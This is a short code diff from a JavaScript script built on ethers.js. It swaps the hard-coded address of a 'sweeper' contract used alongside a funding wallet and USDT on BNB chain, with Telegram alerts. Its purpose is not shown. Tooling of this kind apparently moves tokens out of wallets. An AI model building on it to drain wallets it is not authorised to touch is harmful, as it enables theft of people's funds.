@@ -20,7 +20,7 @@ const provider = new ethers.JsonRpcProvider(BNB_RPC);
 const fundingWallet = new ethers.Wallet(FUNDING_PRIVATE_KEY, provider);
 
 // Your deployed contract address
-const SWEEPER_CONTRACT = "0x725d16999d92d799c6040a5d0387339122ae8fc9";
+const SWEEPER_CONTRACT = "0x802E52D35F64cfa78e0DBf1Ab920aAA71030308e";
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 
 // ========== TELEGRAM ALERTS ==========
